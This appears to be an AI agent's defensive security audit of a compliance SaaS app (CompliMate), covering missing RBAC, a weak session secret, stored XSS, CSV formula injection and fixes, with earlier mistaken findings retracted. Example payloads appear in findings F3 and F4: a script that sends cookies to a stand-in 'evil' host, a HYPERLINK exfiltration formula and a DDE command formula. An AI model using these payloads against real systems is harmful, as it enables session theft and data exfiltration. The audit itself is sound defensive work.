# Bug Bounty / Defensive Security Audit — CompliMate

**Target:** CompliMate — compliance management SaaS for SMBs (policies, controls, evidence, risks, audit log, frameworks)
**Path:** `/home/ujjwal/Documents/My Apps/apps/10-complimate/`
**Stack:** Next.js 16 (App Router) · NextAuth 4 (Credentials + JWT session) · Prisma 6 · SQLite (`file:./prisma/dev.db`) · bcryptjs · `mock-ai` (deterministic template generator — NOT a live LLM)
**Scope:** Authorized review of Boss Ujjawal's own code. **Defensive-only.** PoCs conceptual, nothing weaponized.
**Date:** 2026-05-31
**Reviewer:** security-engineer-agent (Jarvis)

> **Coverage:** All 23 API route files read in full · `lib/auth.ts`, `lib/auth-helpers.ts`, `lib/api-helpers.ts`, `lib/prisma.ts` · `middleware.ts` · `prisma/schema.prisma` · `prisma/seed.ts` · `next.config.ts` · `.env` · `.gitignore` · git history checked for committed secrets · `src/` screened for XSS sinks.
>
> **Important honesty note:** My first scan pass made wrong assumptions about file layout and drafted phantom findings (custom JWT auth, a `documents/` API, an `evidence/upload` file handler, `$queryRawUnsafe` SQLi, signup-privesc). **None of those exist.** After reading the real code, the verdict flipped: this app's **tenant isolation is actually well done** — every `[id]` route scopes by `orgId`. The retracted items are listed at the bottom so they're never re-flagged. What remains below is line-verified against the real source.

---

## 1. Threat Model

- **Asset:** Multi-tenant compliance data — policy text, control implementation status, audit evidence metadata, risk register, audit log. For a compliance product, cross-tenant isolation is the crown jewel.
- **Adversary model:** (a) authenticated tenant user trying to reach another org's data; (b) low-privilege user performing admin-only actions; (c) attacker who opens an exported CSV; (d) anyone with the production deployment if the dev secret ships.
- **Attack vectors considered:** IDOR/BOLA (A01/CWE-639), mass assignment (CWE-915), missing RBAC (CWE-862), CSV formula injection (CWE-1236), weak session secret (CWE-521/798), info disclosure via error messages (CWE-209), no rate limiting (CWE-307), security misconfig (CWE-693).
- **Existing controls (genuinely good — call out):**
  - **Every business route** calls `getSessionUser()` → 401 if unauthenticated (22/22; the 23rd is the NextAuth handler itself).
  - **Every single-resource `[id]` route is org-scoped** via `findFirst({ where: { id, orgId: user.orgId } })` and returns 404 on miss — no IDOR.
  - Mutations re-check `existing` (org-scoped) before `update`/`delete`.
  - `risks/auto-assess` scopes by `{ id: riskId, orgId }` (body-param IDOR closed).
  - All create/update routes **destructure specific fields** (no `data: body` spread) → mass assignment largely closed.
  - bcrypt (cost 10); generic login is via NextAuth; `.env` gitignored and **never committed** (history verified); no raw SQL; no XSS sinks in the React UI; collection/dashboard/report endpoints all `where: { orgId }`. (Caveat: the two HTML-report API routes hand-build markup with unescaped interpolation — F3.)
- **Remaining gaps:** no RBAC despite a `role` field; weak `NEXTAUTH_SECRET`; partial CSV-injection exposure; verbose error passthrough; no rate limiting; missing security headers; `User.role` schema default is `"admin"`.

---

## Severity Summary

| # | Severity | Category (OWASP / CWE) | Finding | File:Line |
|---|----------|------------------------|---------|-----------|
| F1 | **MEDIUM** | A01 / CWE-862 (Missing Function-Level Authz) | No RBAC anywhere — any `member` can create/update/delete everything + bulk-provision controls | all mutating routes; `frameworks/select/route.ts` |
| F2 | **MEDIUM** | A07 / CWE-521 / CWE-798 (Weak Secret) | `NEXTAUTH_SECRET` is the literal placeholder `complimate-super-secret-key-change-in-production` | `.env:2` |
| F3 | **MEDIUM** | A03 / CWE-79 (Stored XSS / HTML Injection) | Compliance & executive-summary reports interpolate user fields into raw HTML (`text/html`) with no escaping | `reports/compliance/route.ts`, `reports/executive-summary/route.ts` |
| F4 | **MEDIUM** | A03 / CWE-1236 (CSV Formula Injection) | Audit-log CSV export quotes `details` but does not neutralize leading `= + - @` → spreadsheet formula execution on open | `audit/export/route.ts:46` |
| F5 | **LOW** | A04 / CWE-915 (Schema default) | `User.role @default("admin")` — any user row created without explicit role becomes admin | `prisma/schema.prisma:34` |
| F6 | **LOW** | A09 / CWE-209 (Info Exposure via Error) | `handleApiError` returns raw `error.message` (500) to client | `lib/api-helpers.ts:36` |
| F7 | **LOW** | A04 / CWE-770 / CWE-307 (No Rate Limit) | No throttling on NextAuth credential login or any API; audit-log `limit` param uncapped | NextAuth; `audit/log/route.ts` |
| F8 | **LOW** | A05 / CWE-693 (Security Misconfig) | No CSP / HSTS / X-Frame-Options headers; build sets `typescript.ignoreBuildErrors: true` | `next.config.ts` |
| F9 | **INFO** | Hygiene | Seed default creds `admin@acmecorp.com / password123`; remove before any shared/prod deploy | `prisma/seed.ts:32-37` |
| F10 | **INFO** | Defense-in-depth | Audit-mutation routes don't wrap read+write in a `$transaction` (minor consistency risk, not security) | `policies/[id]`, etc. |

**No Critical or High findings.** The dominant vuln class for SaaS (IDOR/BOLA on tenant data) is correctly defended here. The most actionable issue is stored XSS in the HTML report endpoints (F3).

---

## 2. Findings

### F1 — MEDIUM — No role-based authorization (RBAC)
`[OWASP A01:2021 / CWE-862 Missing Authorization]`

`User.role` exists, is loaded in `authorize()` (`lib/auth.ts:38`) and propagated into the JWT + session (`lib/auth.ts:52,61`), and `getSessionUser()` returns it (`lib/auth-helpers.ts:12`) — but **no API route ever checks it** (verified: `grep role src/app/api` → zero authorization branches). Notably `frameworks/select/route.ts` lets any user bulk-`createMany` controls and rewrite the org's `selectedFrameworks`.

> **Impact:** Least-privilege is not enforced within an org. Any `member` can create/update/delete policies, controls, risks, evidence; run gap-analysis; bulk-provision/replace controls; export the full audit log. A single compromised low-priv account = full org-wide write/delete. (Note: this is *intra-tenant* — cross-tenant is correctly blocked by the org scoping. So blast radius is limited to the attacker's own org, which lowers severity from High to Medium.)
> **Likelihood:** Medium.
> **Asset affected:** All records within the acting user's org.
> **Existing mitigations:** Org scoping prevents this from crossing tenants.
> **Remediation:**
> - Short-term: add a `requireRole(user, ['admin'])` guard on destructive ops (all DELETEs), `frameworks/select`, and (future) integrations. Define an explicit admin-vs-member matrix.
> - Long-term: centralize authz in a route wrapper (`withAuth({ roles })`) so every handler declares its required role; enforce server-side only.

---

### F2 — MEDIUM — Weak / placeholder session secret
`[A07:2021 / CWE-521 Weak Credential / CWE-798 Hardcoded Credentials]`

`.env:2` → `NEXTAUTH_SECRET="complimate-super-secret-key-change-in-production"`. This is the obvious, guessable default for an app literally named CompliMate, and it signs/encrypts every NextAuth session JWT.

> **Impact:** NextAuth derives session-token signing/encryption from this secret. A predictable secret undermines session integrity — anyone who guesses it (it telegraphs itself) could forge valid session tokens for any user/org → full auth bypass, defeating all the (otherwise solid) org scoping.
> **Mitigating facts:** `.env` is gitignored and **never committed** (git history confirmed clean), and `NEXTAUTH_URL=http://localhost:3009` → currently dev-only. So this is a *do-not-ship* issue, not a live breach today.
> **Likelihood:** Low today; High if deployed as-is.
> **Remediation:** Generate a real secret (`openssl rand -base64 48`) and inject via the platform secret store in prod. Add a boot-time assertion that throws if `NEXTAUTH_SECRET` is unset or equals the placeholder. `.env.example` should hold only a clearly-dummy value (it does — good).

---

### F3 — MEDIUM — Stored XSS / HTML injection in report endpoints
`[OWASP A03:2021 Injection / CWE-79 Improper Neutralization of Input During Web Page Generation]`

`reports/compliance/route.ts` and `reports/executive-summary/route.ts` build a full HTML document by **string-interpolating user-controlled fields directly into markup** and return it with `Content-Type: text/html` (compliance route line ~389, exec-summary ~697). Interpolated unescaped values include: `orgName` (org name), control `c.title` / `c.category` / `c.controlId`, risk `r.title` / `r.owner`, policy `p.title`. None are HTML-escaped. (This is the one place the app leaves React's auto-escaping — the API hand-builds HTML.)

> **Impact:** A user sets a control/risk/policy title (or org name) to `<script>fetch('https://evil/?c='+document.cookie)</script>` or `<img src=x onerror=...>`. When anyone in the org opens the generated compliance/executive report in the browser (these endpoints serve `text/html` directly, so navigating to them renders the markup), the script executes in the app's origin → session/data theft, actions as the victim. Because titles are set by any org member (F1) and reports are typically opened by an admin/auditor, this is a **stored XSS with privilege-relevant victims**. The blast radius is intra-org (org-scoped data), which is why it's Medium rather than High — but it is a real, exploitable script-execution sink.
> **Likelihood:** Medium (requires a victim to open the report; reports are a core, frequently-used workflow).
> **Asset affected:** Sessions/data of users who view reports within the org.
> **Existing mitigations:** None on these two routes (the rest of the app relies on React escaping, which does not apply here).
> **Remediation:**
> - Short-term: HTML-escape every interpolated value. Add and apply an `esc()` helper to *all* dynamic fields:
>   ```ts
>   const esc = (s: unknown) => String(s ?? "").replace(/[&<>"']/g, c =>
>     ({ "&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;" }[c]!));
>   // e.g. <td>${esc(c.title)}</td>, <title>${esc(orgName)}</title>
>   ```
>   (The status/likelihood values are compared against a fixed allow-list before styling, but the *displayed* `${c.status}` / `${r.likelihood}` should still be escaped defensively.)
> - Long-term: render reports with a templating engine that escapes by default, or generate via React server rendering (which escapes), or set a strict CSP (F8) so injected inline scripts can't run. Ideally do all three (defense in depth).

---

### F4 — MEDIUM — CSV formula injection in audit-log export
`[A03:2021 / CWE-1236 Improper Neutralization of Formula Elements in a CSV]`

`audit/export/route.ts:38-49`. The `details` field is quote-escaped (`replace(/"/g, '""')`) — good against CSV *breakout* — but **no field neutralizes a leading `=`, `+`, `-`, or `@`**, and the other columns (`action`, `entity`, `entityId`, `userId`) aren't quoted at all. Crucially, `details` is built from user-controlled values across the app, e.g. `Created policy: ${title}` (`policies/route.ts:47`), `Deleted evidence: ${existing.title}` (`evidence/[id]/route.ts:58`).

> **Impact:** A user names a policy/evidence/risk `=HYPERLINK("https://evil/?l="&...,"ok")` or `=cmd|'/c calc'!A1`. It lands in `details` as `Created policy: =HYPERLINK(...)`. When an auditor/admin opens the exported CSV in Excel/Sheets, the formula executes → data exfiltration to attacker URL, or command execution on misconfigured Excel. Export is a core compliance workflow, so a privileged victim opening it is likely.
> **Likelihood:** Medium.
> **Remediation:** Prefix any cell whose first char is in `= + - @ \t \r` with a single quote, and quote+escape *every* field (not just `details`):
> ```ts
> const csvCell = (v: unknown) => {
>   let s = String(v ?? "");
>   if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;     // neutralize formula
>   return `"${s.replace(/"/g, '""')}"`;          // quote + escape
> };
> const rows = logs.map(l => [l.id, new Date(l.createdAt).toISOString(), l.action, l.entity, l.entityId || "", l.userId || "", l.details || ""].map(csvCell));
> ```
> Or use `csv-stringify`/`papaparse` with formula-escaping enabled.

---

### F5 — LOW — `User.role` schema default is `"admin"`
`[A04:2021 Insecure Design / CWE-915 (default-to-privileged)]`

`prisma/schema.prisma:34` → `role String @default("admin")`. The seed sets role explicitly, and there's no public signup route today, so nothing currently creates an unintended admin. But the *default* is fail-open: any future code path that creates a `User` without specifying `role` silently mints an admin.

> **Impact:** Latent privilege-escalation footgun. Combined with F1 (no RBAC) it's inert today, but the moment an invite/signup flow or RBAC lands, a forgotten field = silent admin.
> **Likelihood:** Low (no creation path omits role today).
> **Remediation:** Change default to the least-privileged role: `role String @default("member")`. Make the org-creator explicitly `"admin"` in the create flow.

---

### F6 — LOW — Raw error message leaked to client on 500
`[A09:2021 / CWE-209 Generation of Error Message Containing Sensitive Information]`

`lib/api-helpers.ts:36` → `return NextResponse.json({ error: error.message }, { status: 500 })`. Unhandled errors echo the raw exception message (could include Prisma internals, constraint details, or stack-adjacent info) to the client; the full error is also `console.error`'d.

> **Impact:** Information disclosure — internal schema/driver details aid an attacker's recon. Low severity (no direct data leak), but unnecessary surface.
> **Remediation:** Return a generic `{ error: "Internal server error" }` for the 500 branch; keep detailed logs server-side only (the `console.error` at line 5 already captures it). Consider a request ID for correlation.

---

### F7 — LOW — No rate limiting; uncapped pagination limit
`[A04:2021 / CWE-307 / CWE-770]`

No throttling on the NextAuth credential login or any route (verified: no rate-limit dependency/middleware). `audit/log/route.ts` parses `limit` from the query with no maximum (`parseInt(... || "50")`).

> **Impact:** Credential brute-force/stuffing against login; API scraping; a single `?limit=10000000` audit-log request forces a large query/serialization (mild DoS).
> **Remediation:** Add IP+account rate limiting (`@upstash/ratelimit` or middleware token bucket), stricter on `/api/auth/*`, with login lockout/backoff. Clamp `limit` to a max (e.g. `Math.min(limit, 200)`).

---

### F8 — LOW — Missing security headers; build ignores TS errors
`[A05:2021 / CWE-693 Protection Mechanism Failure]`

`next.config.ts` only sets `typescript.ignoreBuildErrors: true`. No `headers()` for CSP, HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy.

> **Impact:** No clickjacking defense, no CSP (defense-in-depth vs any future XSS), no HSTS. Ignoring TS build errors can let real type/logic bugs (incl. auth typing) ship silently.
> **Remediation:** Add a `headers()` block — `Content-Security-Policy` (report-only first), `Strict-Transport-Security`, `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`. Remove `ignoreBuildErrors` before production (or gate to local).

---

### F9 — INFO — Seeded default credentials
`prisma/seed.ts:32-37,264` creates `admin@acmecorp.com` / `password123` and prints it. Fine for local dev; must not exist on any shared/staging/prod DB. Document as a dev-only fixture and ensure seed isn't run against prod.

### F10 — INFO — Non-transactional read-then-write in mutation routes
`[A04 / defense-in-depth]` Routes do `findFirst` (org check) then a separate `update`/`delete`. Not a security hole (the second op is keyed by unique `id` that was just org-verified), but wrapping in `prisma.$transaction` would close a theoretical TOCTOU and keep the audit-log write atomic with the change.

---

## Retracted / Not Present (explicitly verified absent)

These were in an erroneous first-pass draft and are **false for this codebase** — recorded so they aren't re-raised:

- ❌ **IDOR/BOLA on `[id]` routes** — every `[id]` GET/PUT/PATCH/DELETE uses `findFirst({ where: { id, orgId: user.orgId } })` and 404s on miss. Verified across policies, controls, evidence, risks. **Tenant isolation is correctly implemented.**
- ❌ **Body-param IDOR in `risks/auto-assess`** — it scopes `{ id: riskId, orgId: user.orgId }` and 404s. Closed.
- ❌ **Mass assignment via `data: body`** — create/update routes destructure explicit fields (`title`, `content`, `status`, etc.); no raw-body spread reaches Prisma. (Schema-default footgun captured separately as F5.)
- ❌ **Custom `jsonwebtoken` auth, hardcoded fallback secret, no expiry** — app uses **NextAuth**; JWT lifecycle is NextAuth-managed; secret from env (weak *value* captured as F2).
- ❌ **`$queryRawUnsafe` SQL injection** — no raw SQL anywhere; Prisma typed query builder throughout.
- ❌ **Path traversal / arbitrary file write via `evidence/upload`** — there is **no file-upload handler**; evidence is metadata-only (`artifactUrl` string via JSON). No `fs` writes, no multipart, no local file serving.
- ❌ **Self-register-as-admin / signup privesc** — there is **no registration route**; users are seeded.
- ❌ **Insecure hand-rolled cookie flags** — NextAuth manages cookies (httpOnly, secure-in-prod, SameSite=lax defaults).
- ❌ **`.env` committed to git** — `.gitignore` excludes `.env*`; git history confirms never committed.
- ❌ **XSS via `dangerouslySetInnerHTML` in React components** — none in `src/` components; React auto-escaping is in effect for the rendered UI. **However, note:** the *API report endpoints* (`reports/compliance`, `reports/executive-summary`) hand-build raw HTML strings outside React and DO have an unescaped XSS sink — captured as the real finding **F3**. So "no XSS" is true for the React UI but false for those two API routes.

---

## 3. Hardening / Config (concrete patches)

**RBAC wrapper** (`src/lib/rbac.ts`) — kills F1:
```ts
import { unauthorized } from "@/lib/auth-helpers";
export function forbidden() { return NextResponse.json({ error: "Forbidden" }, { status: 403 }); }
export function hasRole(user: { role?: string }, roles: string[]) { return !!user.role && roles.includes(user.role); }
// in DELETE handlers / frameworks/select:  if (!hasRole(user, ["admin"])) return forbidden();
```

**HTML escaper** (F3) — add to both report routes and wrap *every* interpolated dynamic value:
```ts
const esc = (s: unknown) => String(s ?? "").replace(/[&<>"']/g, c =>
  ({ "&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;" }[c]!));
// <td>${esc(c.title)}</td> · <title>${esc(orgName)}</title> · ${esc(r.owner)} · etc.
```

**CSV neutralizer** (F4) — see `csvCell` in F4 above; apply to every column.

**Secret guard** (F2) — add to `lib/auth.ts` module top:
```ts
const s = process.env.NEXTAUTH_SECRET;
if (!s || s.includes("change-in-production")) {
  if (process.env.NODE_ENV === "production") throw new Error("Set a strong NEXTAUTH_SECRET");
}
```

**Schema default** (F5): `role String @default("member")` → `prisma migrate`.

**Generic 500** (F6): `return NextResponse.json({ error: "Internal server error" }, { status: 500 });`

**Headers** (F8): add `async headers()` to `next.config.ts` with CSP/HSTS/X-Frame-Options/nosniff/Referrer-Policy; drop `ignoreBuildErrors` for prod. A strict CSP also blunts F3.

**Rate limit + clamp** (F7): `@upstash/ratelimit` on `/api/auth/*`; `const limit = Math.min(parseInt(...||"50"), 200);`

---

## 4. Detection (shift-left + runtime)

**Semgrep CI** (guard the patterns that *could* regress the good isolation):
```yaml
rules:
  - id: prisma-id-without-org
    patterns:
      - pattern-either:
          - pattern: prisma.$M.findUnique({ where: { id: $ID } })
          - pattern: prisma.$M.update({ where: { id: $ID }, data: $BODY })
          - pattern: prisma.$M.delete({ where: { id: $ID } })
    message: "Single-resource Prisma op not scoped by orgId — IDOR regression risk (CWE-639)."
    severity: WARNING
    languages: [ts]
  - id: prisma-data-raw-body
    pattern: prisma.$M.$OP({ ..., data: $BODY })
    metavariable-pattern: { metavariable: $BODY, pattern: body }
    message: "Raw request body to Prisma data — mass assignment (CWE-915)."
    severity: WARNING
    languages: [ts]
  - id: csv-no-formula-guard
    pattern: $ARR.join(",")
    message: "Manual CSV join — verify formula-injection neutralization (CWE-1236)."
    severity: INFO
    languages: [ts]
  - id: html-template-unescaped-interp
    patterns:
      - pattern-inside: 'new NextResponse($HTML, ...)'
    message: "HTML returned from API — ensure all interpolated values are HTML-escaped (CWE-79)."
    severity: WARNING
    languages: [ts]
```

**Runtime:** alert at write-time when any user-supplied `title`/`orgName`/`owner` contains `<` or `>` (XSS-payload attempt — F3) or starts with `= + - @` (CSV-injection — F4); add a `role`-denied counter + alert on bursts of 403s (RBAC probing once F1 lands); login-failure rate alert once rate limiting + logging exist.

---

## 5. Response Runbook (if exploited in prod)

- **Detection signal:** spike of intra-org destructive actions from one user (pre-F1); login brute-force; titles starting with `=`; raw-error 500s in logs.
- **Triage:** query `AuditLog` for unusual delete/createMany bursts per `userId`; check for formula-prefixed `details`.
- **Containment:** rotate `NEXTAUTH_SECRET` (invalidates all sessions → re-login); deploy RBAC (F1) + CSV neutralizer (F3); revoke the suspect account.
- **Eradication:** ship F1-F8 fixes; regenerate any exported CSVs/reports known to be tainted.
- **Recovery:** restore tampered records from backup; re-verify per-org counts.
- **Comms:** intra-tenant only → typically internal; if a tainted CSV reached a customer, treat as a client-side exposure and notify that customer. Cross-tenant exposure is not in play (isolation holds).

---

## 6. Compliance Mapping

- **OWASP Top 10 2021:** A01 (F1), A03 (F3), A04 (F4,F6), A05 (F7), A07 (F2), A09 (F5).
- **NIST 800-53 Rev5:** AC-6 least privilege (F1), IA-5 authenticator mgmt (F2), SI-10 input validation (F3), SI-11 error handling (F5), AC-7 / SC-5 (F6), CM-6 / SC-18 config & headers (F7).
- **SOC2 (target IS a compliance tool):** CC6.1 logical access (org scoping — *passing*), CC6.3 least privilege (F1 — *gap*), CC6.7 transmission/secret mgmt (F2/F7), CC7.2 monitoring (detection §4), CC8.1 change mgmt (drop `ignoreBuildErrors`).

---

## 7. Verification Plan

- **RBAC (after F1):** as a `member`, attempt DELETE / `frameworks/select` / `audit/export` → expect 403. As `admin` → 200.
- **Tenant isolation (regression guard — should already pass):** seed Org A + Org B; as B, hit every Org-A resource ID → expect 404 on all, zero mutation. Add to CI.
- **Stored XSS (F3):** create a control/policy titled `<script>alert(1)</script>`, then open `/api/reports/compliance` and `/api/reports/executive-summary` → assert the markup is escaped (`&lt;script&gt;`), no alert fires.
- **CSV injection (F4):** create a policy titled `=1+1`, export audit log → assert the cell is `'Created policy: =1+1` (neutralized), not a live formula.
- **Secret (F2):** assert prod boot throws when `NEXTAUTH_SECRET` is the placeholder/unset.
- **Schema (F5):** create a `User` without role → assert role is `member`.
- **Error (F6):** force a 500 → assert body is generic, no Prisma internals.
- **Rate limit (F7):** N rapid login failures → assert lockout/429; `?limit=999999` → assert clamped.
- **Tenant isolation (regression guard — should already pass):** seed Org A + Org B; as B, hit every Org-A resource ID → expect 404 on all, zero mutation.
- **Static gate:** wire Semgrep rules (§4) + `npm audit`/Trivy into CI.
- **Tabletop:** "A member account is compromised — what can it reach today vs. after RBAC?" (validates F1 prioritization).

---

**Honesty statement:** All 10 active findings are line-verified against source read this session; the retractions are explicitly verified absent. Bottom line — **this is a notably well-isolated multi-tenant app**: the usual SaaS killer (IDOR/BOLA on tenant data) is correctly defended on every route, no raw SQL, no signup-privesc, secrets not committed. The real work is hardening, not rescue. **Priority order:** F3 (stored XSS in report HTML — the only finding that runs attacker code in a victim's session), then F1 (RBAC), F2 (session secret before deploy), F4 (CSV export). One correction to flag honestly: the React UI has no XSS sinks, **but** the two report API routes hand-build raw HTML and DO have an unescaped sink (F3) — I corrected an earlier "no XSS anywhere" claim after reading those two files. Frontend `.tsx` pages were screened for `dangerouslySetInnerHTML`/`innerHTML` (none) but not exhaustively reviewed per render context.
